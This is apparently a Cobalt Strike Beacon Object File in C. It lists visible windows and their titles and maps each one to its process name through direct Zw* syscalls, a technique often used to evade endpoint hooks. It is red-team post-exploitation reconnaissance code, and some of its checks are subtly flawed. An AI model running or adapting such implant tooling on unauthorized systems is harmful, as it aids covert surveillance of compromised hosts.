#include <windows.h>

#include "Syscalls.h"
#include "beacon.h"
#include "Psw.h"


BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
	NTSTATUS status;
	DWORD dwProcessId = 0;
	CHAR chWindowTitle[2048];
	LPVOID pBuffer = NULL;
	SIZE_T uSize = 0;

	if (!hWnd) {
		return TRUE;
	}

	if (!USER32$IsWindowVisible(hWnd)) {
		return TRUE;
	}

	MSVCRT$memset(chWindowTitle, 0, sizeof(chWindowTitle));
	if (!USER32$SendMessageA(hWnd, WM_GETTEXT, sizeof(chWindowTitle), (LPARAM)chWindowTitle)){
		return TRUE;
	}

	USER32$GetWindowThreadProcessId(hWnd, &dwProcessId);

	if (dwProcessId != 0) {
		ULONG uReturnLength = 0;
		status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
		if (!status == STATUS_INFO_LENGTH_MISMATCH) {
			return TRUE;
		}

		uSize = uReturnLength;
		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
		if (status != STATUS_SUCCESS) {
			goto CleanUp;
		}

		status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
		if (status != STATUS_SUCCESS) {
			goto CleanUp;
		}

		PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
		do {
			pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

			if (HandleToUlong(pProcInfo->ProcessId) == dwProcessId) {
				BeaconPrintf(CALLBACK_OUTPUT,
					"[+] ProcessName:\t %wZ\n"
					"    ProcessID:\t %d\n"
					"    WindowTitle:\t %s\n", &pProcInfo->ProcessName, dwProcessId, chWindowTitle);
				break;
			}
			else if (pProcInfo->NextEntryDelta == 0) {
				BeaconPrintf(CALLBACK_OUTPUT,"\n[!] ProcessID not found.\n");
				break;
			}

		} while (pProcInfo);
	}

CleanUp:

	if (pBuffer != NULL) {
		status = ZwFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
	}

	return TRUE;
}


VOID go(IN PCHAR Args, IN ULONG Length) {
	USER32$EnumWindows(EnumWindowsProc, (LPARAM)NULL);

	return;
}
